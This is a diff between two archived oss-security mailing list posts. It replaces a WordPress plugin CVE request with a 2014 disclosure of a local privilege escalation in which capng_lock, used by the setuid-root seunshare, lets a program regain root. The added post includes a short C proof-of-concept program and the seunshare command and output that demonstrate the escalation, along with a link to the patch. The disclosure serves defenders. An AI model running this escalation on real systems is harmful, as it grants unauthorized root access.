@@ -1,29 +1,67 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/07/02/1
-Message-ID: <20140702080316.GB13757@kludge.henri.nerv.fi>
-Date: Wed, 2 Jul 2014 11:03:16 +0300
-From: Henri Salo <henri@...v.fi>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/04/29/7
+Message-ID: <CALCETrW6LF=n0HD2vSZuo7FXM6oh_t1HyoRxEUoE+dg8HGjB8A@mail.gmail.com>
+Date: Tue, 29 Apr 2014 14:20:47 -0700
+From: Andy Lutomirski <luto@...capital.net>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: WordPress plugin wysija-newsletters remote file upload
+Subject: local privilege escalation due to capng_lock as used in seunshare
 Content-Type: text/plain; charset=utf-8
 
-Can I get 2014 CVE for remote file upload vulnerability in WordPress plugin
-wysija-newsletters, thanks.
+cap-ng's capng_lock function is insecure, seunshare uses it, and
+seunshare is installed setuid root.
 
-Plugin name: MailPoet Newsletters
-Plugin page: https://wordpress.org/plugins/wysija-newsletters/
-Fixed in: 2.6.7
-Discovered and reported by Sucuri
+This results in a setuid program like this:
 
-Reference:
-http://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <err.h>
 
-Also detected by wpscan-tool:
-https://github.com/wpscanteam/wpscan/commit/f9b10dc9db45f400918348b777f662c7140ee5fe
+int main()
+{
+  if (setuid(getuid()) != 0)
+    err(1, "setuid(getuid())");
 
-I can provide diffs between the versions if needed.
+  printf("Dropped privs; real uid is %lu and effective uid is %lu\n",
+     (unsigned long)getuid(), (unsigned long)geteuid());
 
----
-Henri Salo
+  seteuid(0);
 
-Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
+  /* Do something that risks executing untrusted code here */
+
+  if (geteuid() == 0) {
+    printf("It's baaaack!\n");
+  } else {
+    printf("Phew, safe.\n");
+  }
+
+  return 0;
+}
+
+behaving like this:
+
+$ ./sesploit
+Dropped privs; real uid is 1000 and effective uid is 1000
+Phew, safe.
+
+This is okay until an attacker does:
+
+$ seunshare -t . `realpath ./sesploit`
+Dropped privs; real uid is 1000 and effective uid is 1000
+It's baaaack!
+
+newrole may have the same issue.
+
+This was described recently here:
+http://seclists.org/fulldisclosure/2014/Apr/262
+
+and has been publicly disclosed in Red Hat's bugzilla for quite some time:
+https://bugzilla.redhat.com/show_bug.cgi?id=1035427
+https://bugzilla.redhat.com/show_bug.cgi?id=885288
+
+I believe that there is at least one setuid program that can be used
+as a vector and is widely installed.
+
+There's a patch here:
+
+https://bugzilla.redhat.com/attachment.cgi?id=829864
